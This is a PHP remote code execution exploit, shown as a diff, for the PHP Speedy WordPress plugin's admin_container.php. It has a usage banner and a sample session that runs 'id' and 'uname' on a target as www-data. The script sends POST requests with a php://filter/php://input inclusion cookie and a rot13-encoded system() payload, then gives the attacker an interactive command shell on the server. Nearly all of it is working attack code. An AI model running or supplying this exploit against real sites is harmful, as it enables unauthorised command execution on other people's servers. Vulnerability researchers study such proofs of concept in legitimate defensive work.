@@ -1,0 +1,157 @@
+<?php
+/*
+php speedy <= 0.5.2 wordpress plugin (admin_container.php) Remote Code Exec Exploit
+vendor: http://aciddrop.com/
+-------------------------------
+May the stars be aligned!
+php.ini requirements: 
+register_globals=On 
+allow_url_include=On 
+magic_quotes_gpc=Off
+------------------------------
+[mr_me@pluto php_speedy]$ php PoC.php -t 10.3.100.3:80 -d /webapps/wp/ -p 127.0.0.1:8080
+
+-----------------------------------------------------------------------------------
+php speedy <= 0.5.3 wordpress plugin (admin_container.php) Remote Code Exec Exploit
+by mr_me - https://net-ninja.net/
+-----------------------------------------------------------------------------------
+(+) Setting the proxy to 127.0.0.1:8080
+
+mr_me@10.3.100.3# id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+
+mr_me@10.3.100.3# uname -a
+Linux steven-desktop 2.6.32-28-generic #55-Ubuntu SMP Mon Jan 10 21:21:01 UTC 2011 i686 GNU/Linux
+
+mr_me@10.3.100.3# q
+*/
+
+print_r("
+-----------------------------------------------------------------------------------
+php speedy <= 0.5.2 wordpress plugin (admin_container.php) Remote Code Exec Exploit
+by mr_me - https://net-ninja.net/
+-----------------------------------------------------------------------------------
+");
+
+if ($argc < 3) {
+print_r("
+-----------------------------------------------------------------------------
+Usage: php ".$argv[0]." -t <host:ip> -d <path> OPTIONS
+host:      target server (ip/hostname)
+path:      directory path to wordpress
+Options:
+ -p[ip:port]: specify a proxy
+Example:
+php ".$argv[0]." -t 192.168.1.5 -d /wp/ -p 127.0.0.1:8080
+php ".$argv[0]." -t 192.168.1.5 -d /wp/
+-----------------------------------------------------------------------------
+"); die; }
+
+error_reporting(7);
+ini_set("max_execution_time", 0);
+ini_set("default_socket_timeout", 5);
+
+$proxy_regex = "(\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b)";
+
+function setArgs($argv){
+    $_ARG = array();
+    foreach ($argv as $arg){
+        if (ereg("--([^=]+)=(.*)", $arg, $reg)){
+            $_ARG[$reg[1]] = $reg[2];
+        }elseif(ereg("^-([a-zA-Z0-9])", $arg, $reg)){
+            $_ARG[$reg[1]] = "true";
+        }else {
+            $_ARG["input"][] = $arg;
+        }
+    }
+    return $_ARG;
+}
+
+
+$myArgs = setArgs($argv);
+$host = $myArgs["input"]["1"];
+$path = $myArgs["input"]["2"];
+
+if (strpos($host, ":") == true){
+    $hostAndPort = explode(":",$myArgs["input"][1]);
+    $host = $hostAndPort[0];
+    $port = (int)$hostAndPort[1];
+}else{
+    $port = 80;
+}
+
+
+if(strcmp($myArgs["p"],"true") === 0){
+    $proxyAndPort = explode(":",$myArgs["input"][3]);
+    $proxy = $proxyAndPort[0];
+    $pport = $proxyAndPort[1];
+    echo "(+) Setting the proxy to ".$proxy.":".$pport."\r\n";
+}else{
+    echo "(-) Warning, a proxy was not set\r\n";
+}
+
+// rgods sendpacketii() function
+function sendpacket($packet){
+    global $myArgs, $proxy, $host, $pport, $port, $html, $proxy_regex;
+    if (strcmp($myArgs["p"],"true") != 0) {
+        $ock = fsockopen(gethostbyname($host),$port);
+        if (!$ock) {
+            echo "(-) No response from ".$host.":".$port; die;
+        }
+    }
+    else {
+        $c = preg_match($proxy_regex,$proxy);
+        if (!$c) {
+            echo "(-) Not a valid proxy...\n"; die;
+        }
+        $ock=fsockopen($proxy,$pport);
+        if (!$ock) {
+            echo "(-) No response from proxy..."; die;
+        }
+    }
+    fputs($ock,$packet);
+    if ($proxy == "") {
+        $html = "";
+        while (!feof($ock)) {
+            $html .= fgets($ock);
+        }
+    }else {
+        $html = "";
+        while ((!feof($ock)) or (!eregi(chr(0x0d).chr(0x0a).chr(0x0d).chr(0x0a), $html))) {
+            $html .= fread($ock,1);
+        }
+    }
+    fclose($ock);
+}
+
+if (strcmp($myArgs["p"], "true") != 0) {$p = $path;} else {$p = "http://".$host.":".$port.$path;}
+
+function read(){
+    $fp1 = fopen("/dev/stdin", "r");
+    $input = fgets($fp1, 255);
+    fclose($fp1);
+    return $input;
+}
+
+while ($cmd != "q"){
+echo "\n".get_current_user()."@".$host."# ";
+$cmd = trim(read());
+
+// maybe use base64 for better filter evasion 
+$data = str_rot13("<?php eval(system(\"".$cmd."\")); ?>");
+$packet = "POST ".$p."wp-content/plugins/php_speedy_wp/libs/php_speedy/view/admin_container.php HTTP/1.1\r\n";
+$packet .= "Host: ".$host."\r\n";
+$packet .= "Content-Type: application/x-www-form-urlencoded\r\n";
+$packet .= "Cookie: page=php://filter/read=string.rot13/resource=php://input%00\r\n";
+$packet .= "Content-Length: ".strlen($data)."\r\n";
+$packet .= "Connection: Close\r\n\r\n";
+$packet .= $data;
+
+if ($cmd != "q"){
+    sendpacket($packet);
+    $temp = explode("Parse error",$html);
+    $______finalresponse = explode("/></a>", $temp[0]);
+    echo trim($______finalresponse[1])."\r\n";
+    }
+}
+?>
